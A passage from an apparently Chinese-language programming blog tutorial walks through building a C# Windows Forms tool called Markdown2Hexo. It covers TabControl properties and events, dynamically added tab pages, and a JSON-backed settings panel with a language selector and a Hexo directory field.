<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.Alignment = TabAlignment.Top; <span class="comment">// 顶部对齐</span></span><br></pre></td></tr></table></figure></div></li>
<li><p><strong><code>ItemSize</code></strong></p>
<p>获取或设置选项卡的大小（宽度和高度）。</p>
<p><strong>类型</strong>: <code>Size</code></p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.ItemSize = <span class="keyword">new</span> Size(<span class="number">100</span>, <span class="number">30</span>); <span class="comment">// 设置选项卡宽度和高度</span></span><br></pre></td></tr></table></figure></div></li>
<li><p><strong><code>Multiline</code></strong></p>
<p>获取或设置是否允许选项卡多行显示。</p>
<p><strong>类型</strong>: <code>bool</code></p></li>
<li><p><strong><code>TabIndex</code></strong></p>
<p>获取或设置 <code>TabControl</code>
的索引（即它在窗体中所占的位置）。</p>
<p><strong>类型</strong>: <code>int</code></p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span> tabIndex = tabControl.TabIndex;</span><br><span class="line">tabControl.TabIndex = <span class="number">1</span>; <span class="comment">// 设置选项卡的索引</span></span><br></pre></td></tr></table></figure></div></li>
<li><p><strong><code>TabStop</code></strong></p>
<p>获取或设置是否允许在 <code>TabControl</code> 中使用 Tab
键进行切换。</p>
<p><strong>类型</strong>: <code>bool</code></p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.TabStop = <span class="literal">false</span>; <span class="comment">// 禁用 Tab 键切换</span></span><br></pre></td></tr></table></figure></div></li>
<li><p><strong><code>Dock</code></strong></p>
<p>获取或设置 <code>TabControl</code> 的停靠方式。</p>
<p><strong>类型</strong>: <code>DockStyle</code></p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.Dock = DockStyle.Fill; <span class="comment">// 填充整个容器</span></span><br></pre></td></tr></table></figure></div></li>
<li><p><strong><code>Height</code> 和 <code>Width</code></strong></p>
<p>获取或设置 <code>TabControl</code> 的高度和宽度。</p>
<p><strong>类型</strong>: <code>int</code></p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.Height = <span class="number">300</span>; <span class="comment">// 设置高度</span></span><br><span class="line">tabControl.Width = <span class="number">500</span>;  <span class="comment">// 设置宽度</span></span><br></pre></td></tr></table></figure></div></li>
</ol>
<p><strong>常用方法</strong></p>
<ol type="1">
<li><p><strong><code>Add(TabPage page)</code></strong></p>
<p>向 <code>TabControl</code> 中添加一个新的 <code>TabPage</code>。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">TabPage newPage = <span class="keyword">new</span> TabPage(<span class="string">&quot;New Tab&quot;</span>);</span><br><span class="line">tabControl.TabPages.Add(newPage);</span><br></pre></td></tr></table></figure></div></li>
<li><p><strong><code>Remove(TabPage page)</code></strong></p>
<p>从 <code>TabControl</code> 中移除一个 <code>TabPage</code>。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.TabPages.Remove(someTabPage);</span><br></pre></td></tr></table></figure></div></li>
<li><p><strong><code>Clear()</code></strong></p>
<p>清除所有的 <code>TabPage</code>。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.TabPages.Clear(); <span class="comment">// 清空所有选项卡</span></span><br></pre></td></tr></table></figure></div></li>
<li><p><strong><code>SelectTab(int index)</code></strong></p>
<p>通过索引选择某个 <code>TabPage</code>。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.SelectTab(<span class="number">1</span>); <span class="comment">// 选择第2个选项卡（索引从0开始）</span></span><br></pre></td></tr></table></figure></div></li>
<li><p><strong><code>SelectTab(string tabName)</code></strong></p>
<p>通过选项卡的名称选择某个 <code>TabPage</code>。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.SelectTab(<span class="string">&quot;TabName&quot;</span>); <span class="comment">// 选择名称为 &quot;TabName&quot; 的选项卡</span></span><br></pre></td></tr></table></figure></div></li>
<li><p><strong><code>ContainsKey(string key)</code></strong></p>
<p>判断某个 <code>TabPage</code> 是否存在，基于其 <code>Name</code>
属性。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="built_in">bool</span> exists = tabControl.TabPages.ContainsKey(<span class="string">&quot;TabName&quot;</span>);</span><br></pre></td></tr></table></figure></div></li>
<li><p><strong><code>Find(string key, bool searchAllTabs)</code></strong></p>
<p>查找具有指定名称的
<code>TabPage</code>，可以指定是否在所有选项卡中查找。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">TabPage foundTab = tabControl.TabPages.Find(<span class="string">&quot;TabName&quot;</span>, <span class="literal">true</span>)[<span class="number">0</span>];</span><br></pre></td></tr></table></figure></div></li>
<li><p><strong><code>EnableDoubleBuffering()</code></strong></p>
<p>设置 <code>TabControl</code> 是否使用双缓冲机制（帮助避免闪烁）。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.DoubleBuffered = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure></div></li>
</ol>
<p><strong>常用事件</strong></p>
<ol type="1">
<li><p><strong><code>SelectedIndexChanged</code></strong></p>
<p>当选中的选项卡发生变化时触发该事件。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.SelectedIndexChanged += (s, e) =&gt; </span><br><span class="line">&#123;</span><br><span class="line">    MessageBox.Show(<span class="string">&quot;选项卡已切换&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div></li>
<li><p><strong><code>Selecting</code></strong></p>
<p>当选项卡即将被选中时触发该事件。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.Selecting += (s, e) =&gt;</span><br><span class="line">&#123;</span><br><span class="line">    MessageBox.Show(<span class="string">&quot;选项卡正在被选择&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div></li>
<li><p><strong><code>Deselected</code></strong></p>
<p>当选项卡被取消选中时触发该事件。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.Deselected += (s, e) =&gt;</span><br><span class="line">&#123;</span><br><span class="line">    MessageBox.Show(<span class="string">&quot;选项卡已取消选择&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div></li>
<li><p><strong><code>TabIndexChanged</code></strong></p>
<p>当选项卡的索引发生变化时触发该事件。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.TabIndexChanged += (s, e) =&gt;</span><br><span class="line">&#123;</span><br><span class="line">    MessageBox.Show(<span class="string">&quot;选项卡索引发生变化&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div></li>
</ol>
<p>具体实现</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Form1.cs</span></span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.ComponentModel;</span><br><span class="line"><span class="keyword">using</span> System.Data;</span><br><span class="line"><span class="keyword">using</span> System.Drawing;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Forms;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Markdown2Hexo</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">partial</span> <span class="keyword">class</span> <span class="title">Form1</span> : <span class="title">Form</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 用于保存选中的文件夹路径</span></span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">string</span> selectedFilePath;</span><br><span class="line">        <span class="keyword">private</span> TabControl tabControl;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Form1</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            InitializeComponent();</span><br><span class="line">            InitializeCustomComponents();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">		<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">SettingsToolStripMenuItem_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            AddTab(<span class="string">&quot;Settings&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">HelpToolStripMenuItem_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            AddTab(<span class="string">&quot;Help&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 动态创建一个 TabPage，并添加到 TabControl</span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">AddTab</span>(<span class="params"><span class="built_in">string</span> tabName</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 检查该 TabPage 是否已经存在</span></span><br><span class="line">            <span class="keyword">if</span> (tabControl.TabPages.ContainsKey(tabName))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 如果已经存在，直接选中它</span></span><br><span class="line">                tabControl.SelectedTab = tabControl.TabPages[tabName];</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建新的 TabPage</span></span><br><span class="line">            TabPage newTab = <span class="keyword">new</span> TabPage(tabName)</span><br><span class="line">            &#123;</span><br><span class="line">                Name = tabName</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 给 TabPage 添加内容</span></span><br><span class="line">            Label label = <span class="keyword">new</span> Label</span><br><span class="line">            &#123;</span><br><span class="line">                Text = <span class="string">$&quot;<span class="subst">&#123;tabName&#125;</span> Content&quot;</span>,</span><br><span class="line">                Dock = DockStyle.Fill,</span><br><span class="line">                TextAlign = ContentAlignment.MiddleCenter</span><br><span class="line">            &#125;;</span><br><span class="line">            newTab.Controls.Add(label);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将 TabPage 添加到 TabControl</span></span><br><span class="line">            tabControl.TabPages.Add(newTab);</span><br><span class="line">            tabControl.SelectedTab = newTab;  <span class="comment">// 自动选择新创建的 TabPage</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Form1.Designer.cs</span></span><br><span class="line">...</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">InitializeCustomComponents</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 创建 TabControl</span></span><br><span class="line">            tabControl = <span class="keyword">new</span> TabControl();</span><br><span class="line">            tabControl.Dock = DockStyle.Fill;  <span class="comment">// 将 TabControl 填充整个窗体</span></span><br><span class="line">            <span class="keyword">this</span>.Controls.Add(tabControl);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>
<p>此时我们点击Settings就可以更改主窗口的显示了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20250125160006519.png"
                      class=""
                >
<h4 id="设置界面实现">设置界面实现</h4>
<p>这里由于settings是一块单独的逻辑设置，我们可以将其提取为一个单独的类，并且使用json来管理设置项。那么我们之后在主程序中要用到设置的内容时，只需要示例化设置对象并读取对应属性即可。而且可以在这个类中实现每一条配置的面板（包括标签与输入框或选项框）的返回。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"><span class="keyword">using</span> Newtonsoft.Json;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Drawing;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Forms;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Markdown2Hexo</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">SettingsData</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Language &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> SelectedTheme &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> HexoDirectory &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">Settings</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 设置项</span></span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Language &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;    <span class="comment">// 语言选项</span></span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> SelectedTheme &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;   <span class="comment">// 主题选项</span></span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> HexoDirectory &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;       <span class="comment">// Hexo 目录路径</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">string</span> settingsFilePath = <span class="string">&quot;settings.json&quot;</span>;</span><br><span class="line">        <span class="keyword">private</span> SettingsData settingsData;</span><br><span class="line">        <span class="keyword">public</span> ComboBox optionLanguage &#123; <span class="keyword">get</span>; <span class="keyword">private</span> <span class="keyword">set</span>; &#125;    <span class="comment">// 多选框控件</span></span><br><span class="line">        <span class="keyword">public</span> TextBox hexoDirectoryTextBox &#123; <span class="keyword">get</span>; <span class="keyword">private</span> <span class="keyword">set</span>; &#125;   <span class="comment">// 文本框控件</span></span><br><span class="line">        <span class="keyword">public</span> Button browseButton &#123; <span class="keyword">get</span>; <span class="keyword">private</span> <span class="keyword">set</span>; &#125;    <span class="comment">// 按钮控件</span></span><br><span class="line">        <span class="comment">// 构造函数</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Settings</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 加载设置</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">LoadSettings</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (File.Exists(settingsFilePath))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">string</span> json = File.ReadAllText(settingsFilePath);</span><br><span class="line">                <span class="keyword">var</span> settings = JsonConvert.DeserializeObject&lt;Settings&gt;(json);</span><br><span class="line">                <span class="keyword">this</span>.Language = settings.Language;</span><br><span class="line">                <span class="keyword">this</span>.SelectedTheme = settings.SelectedTheme;</span><br><span class="line">                <span class="keyword">this</span>.HexoDirectory = settings.HexoDirectory;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 保存设置</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SaveSettings</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 创建一个新的对象，只包含需要序列化的设置项</span></span><br><span class="line">            settingsData = <span class="keyword">new</span> SettingsData</span><br><span class="line">            &#123;</span><br><span class="line">                Language = <span class="keyword">this</span>.Language,</span><br><span class="line">                SelectedTheme = <span class="keyword">this</span>.SelectedTheme,</span><br><span class="line">                HexoDirectory = <span class="keyword">this</span>.HexoDirectory</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">string</span> json = JsonConvert.SerializeObject(settingsData, Formatting.Indented);</span><br><span class="line">            File.WriteAllText(settingsFilePath, json);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>这里我们设置<strong>SettingsData</strong>这个类的原因在于后面保存设置时，如果直接把<strong>Settings</strong>这个含有各个控件的类进行序列化，会遇到一个自引用循环。具体来说，<code>ComboBox</code>
控件中的某些属性（例如
<code>AccessibilityObject</code>）可能包含对该控件本身的引用，导致在序列化时发生死循环。所以这里我们把其设置属性全部提取到<strong>SettingsData</strong>来避免上述错误发生。</p>
<p>需要注意的是，settings.js的输出目录为<strong>projectdir/bin/Debug/settings.json</strong>，我们如果需要手动赋个初值，也需要在这个目录下创建，而不是直接用visual
studio的创建文件功能。</p>
<h5 id="布局设计">布局设计</h5>
<p>由于我们有很多选项需要显示在窗口中，所以我们要利用<strong>TableLayoutPanel</strong>、<strong>FlowLayoutPanel</strong>等布局控件来优化布局，不然一个一个设置坐标，还要想办法根据屏幕尺寸自适应，会相当麻烦。进阶一点可以使用
<strong>GroupBox</strong> 或者 <strong>TabControl</strong>
来进行更细化的分组。这里我们目前需要的选项较少，就先只用<strong>TableLayoutPanel</strong>进行布局。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">AddTab</span>(<span class="params"><span class="built_in">string</span> tabName</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 检查该 TabPage 是否已经存在</span></span><br><span class="line">    <span class="keyword">if</span> (tabControl.TabPages.ContainsKey(tabName))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 如果已经存在，直接选中它</span></span><br><span class="line">        tabControl.SelectedTab = tabControl.TabPages[tabName];</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建新的 TabPage</span></span><br><span class="line">    TabPage newTab = <span class="keyword">new</span> TabPage(tabName)</span><br><span class="line">    &#123;</span><br><span class="line">        Name = tabName</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 布局设计</span></span><br><span class="line">    TableLayoutPanel tableLayoutPanel = <span class="keyword">new</span> TableLayoutPanel</span><br><span class="line">    &#123;</span><br><span class="line">        RowCount = <span class="number">5</span>, <span class="comment">// 设置行数，根据实际需要调整</span></span><br><span class="line">        ColumnCount = <span class="number">2</span>, <span class="comment">// 设置列数，通常是 2 列</span></span><br><span class="line">        Dock = DockStyle.Fill</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据选中的菜单来切换视图</span></span><br><span class="line">    <span class="keyword">switch</span> (tabName)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;File&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;Help&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;Settings&quot;</span>:</span><br><span class="line">            Settings settings = <span class="keyword">new</span> Settings();     <span class="comment">//获取设置属性</span></span><br><span class="line">            settings.LoadSettings();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            tableLayoutPanel.Controls.Add(settings.CreateLanguageSetting(), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            tableLayoutPanel.Controls.Add(settings.CreateHexoDirectorySetting(), <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            newTab.Controls.Add(tableLayoutPanel);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;Plugins&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 TabPage 添加到 TabControl</span></span><br><span class="line">    tabControl.TabPages.Add(newTab);</span><br><span class="line">    tabControl.SelectedTab = newTab;  <span class="comment">// 自动选择新创建的 TabPage</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这里的<strong>OptionLanguageComboBox</strong>方法我们在下文中会给出具体实现。</p>
<h5 id="语言切换功能">语言切换功能</h5>
<p>目的是能够支持中文和英文两种语言。这里我们打算在
<code>Settings</code> 的 <code>TabPage</code>
中渲染一个选项条，点击后展示待选项，并且实现鼠标悬停时高亮显示选项。</p>
<p>在Settings.cs中加入如下几个方法：</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Control <span class="title">CreateLanguageSetting</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 创建 TableLayoutPanel</span></span><br><span class="line">    TableLayoutPanel tableLayoutPanel = <span class="keyword">new</span> TableLayoutPanel</span><br><span class="line">    &#123;</span><br><span class="line">        ColumnCount = <span class="number">2</span>, <span class="comment">// 创建两列，第一列放 Label，第二列放 ComboBox</span></span><br><span class="line">        RowCount = <span class="number">1</span>, <span class="comment">// 只有一行</span></span><br><span class="line">        Dock = DockStyle.Fill,</span><br><span class="line">        AutoSize = <span class="literal">true</span> <span class="comment">// 自动适应大小</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置列宽度比例</span></span><br><span class="line">    tableLayoutPanel.ColumnStyles.Add(<span class="keyword">new</span> ColumnStyle(SizeType.Percent, <span class="number">20</span>)); </span><br><span class="line">    tableLayoutPanel.ColumnStyles.Add(<span class="keyword">new</span> ColumnStyle(SizeType.Percent, <span class="number">60</span>)); </span><br><span class="line"></span><br><span class="line">    Label label1 = <span class="keyword">new</span> Label</span><br><span class="line">    &#123;</span><br><span class="line">        Text = <span class="string">&quot;Language&quot;</span>,</span><br><span class="line">        TextAlign = ContentAlignment.MiddleLeft,  <span class="comment">// 设置文字在 Label 中垂直和水平居中</span></span><br><span class="line">        Dock = DockStyle.Fill  <span class="comment">// 使 Label 填满单元格</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    optionLanguage = <span class="keyword">new</span> ComboBox</span><br><span class="line">    &#123;</span><br><span class="line">        Name = <span class="string">&quot;Language&quot;</span>, <span class="comment">// 设置 Name</span></span><br><span class="line">        DropDownStyle = ComboBoxStyle.DropDownList,</span><br><span class="line">        Width = <span class="number">200</span>,</span><br><span class="line">        Location = <span class="keyword">new</span> Point(<span class="number">30</span>, <span class="number">50</span>)</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    optionLanguage.Items.Add(<span class="string">&quot;zh&quot;</span>);</span><br><span class="line">    optionLanguage.Items.Add(<span class="string">&quot;en&quot;</span>);</span><br><span class="line">    <span class="built_in">int</span> index = optionLanguage.Items.IndexOf(Language);</span><br><span class="line">    <span class="keyword">if</span> (index != <span class="number">-1</span>)</span><br><span class="line">        optionLanguage.SelectedIndex = index;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        optionLanguage.SelectedIndex = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    optionLanguage.SelectedIndexChanged += ComboBox_SelectedIndexChanged;</span><br><span class="line"></span><br><span class="line">    tableLayoutPanel.Controls.Add(label1);</span><br><span class="line">    tableLayoutPanel.Controls.Add(optionLanguage);</span><br><span class="line">    <span class="keyword">return</span> tableLayoutPanel;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ComboBox 的选项变化事件处理方法</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">ComboBox_SelectedIndexChanged</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 将 sender 强制转换为 ComboBox，以便访问其属性</span></span><br><span class="line">    ComboBox comboBox = sender <span class="keyword">as</span> ComboBox;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (comboBox != <span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 获取选中的索引</span></span><br><span class="line">        <span class="built_in">int</span> selectedIndex = comboBox.SelectedIndex;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 显示相应的多选框面板</span></span><br><span class="line">        ChangeAndSave(selectedIndex, comboBox.Name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法：切换选项并保存设置</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ChangeAndSave</span>(<span class="params"><span class="built_in">int</span> selectedIndex, <span class="built_in">string</span> settingType</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">switch</span> (settingType)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;Language&quot;</span>:</span><br><span class="line">            <span class="comment">// MessageBox.Show($&quot;选项已设置：&quot; + optionLanguage.Items[selectedIndex].ToString());</span></span><br><span class="line">            <span class="keyword">this</span>.Language = optionLanguage.Items[selectedIndex].ToString();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;SelectedTheme&quot;</span>:</span><br><span class="line">            <span class="keyword">this</span>.SelectedTheme = optionLanguage.Items[selectedIndex].ToString();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 保存到文件</span></span><br><span class="line">    SaveSettings();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这里内部也是使用<strong>TableLayoutPanel</strong>进行布局，可以通过<strong>ColumnStyles</strong>设置列宽度，从而在一行中对标签以及选项框进行布局</p>
<p>可以看到已经成功的渲染出了选项标签与选择框。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20250127003008032.png"
                      class=""
                >
<h5 id="hexo目录设置">Hexo目录设置</h5>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Control <span class="title">CreateHexoDirectorySetting</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 创建 TableLayoutPanel</span></span><br><span class="line">    TableLayoutPanel tableLayoutPanel = <span class="keyword">new</span> TableLayoutPanel</span><br><span class="line">    &#123;</span><br><span class="line">        ColumnCount = <span class="number">3</span>, <span class="comment">// 创建三列，第一列放 Label，第二列放 TextBox，第三列放 Button</span></span><br><span class="line">        RowCount = <span class="number">1</span>, <span class="comment">// 只有一行</span></span><br><span class="line">        Dock = DockStyle.Fill,</span><br><span class="line">        AutoSize = <span class="literal">true</span> <span class="comment">// 自动适应大小</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置列宽度（比例为 2:5:1）</span></span><br><span class="line">    tableLayoutPanel.ColumnStyles.Add(<span class="keyword">new</span> ColumnStyle(SizeType.Percent, <span class="number">20</span>)); <span class="comment">// 第一列：20%</span></span><br><span class="line">    tableLayoutPanel.ColumnStyles.Add(<span class="keyword">new</span> ColumnStyle(SizeType.Percent, <span class="number">60</span>)); <span class="comment">// 第二列：60%</span></span><br><span class="line">    tableLayoutPanel.ColumnStyles.Add(<span class="keyword">new</span> ColumnStyle(SizeType.Percent, <span class="number">20</span>)); <span class="comment">// 第三列：20%</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建提示文字</span></span><br><span class="line">    Label label1 = <span class="keyword">new</span> Label</span><br><span class="line">    &#123;</span><br><span class="line">        Text = <span class="string">&quot;Hexo Directory&quot;</span>,</span><br><span class="line">        TextAlign = ContentAlignment.MiddleLeft, <span class="comment">// 使文字左对齐</span></span><br><span class="line">        Dock = DockStyle.Fill <span class="comment">// 使 Label 填充其所在的单元格</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 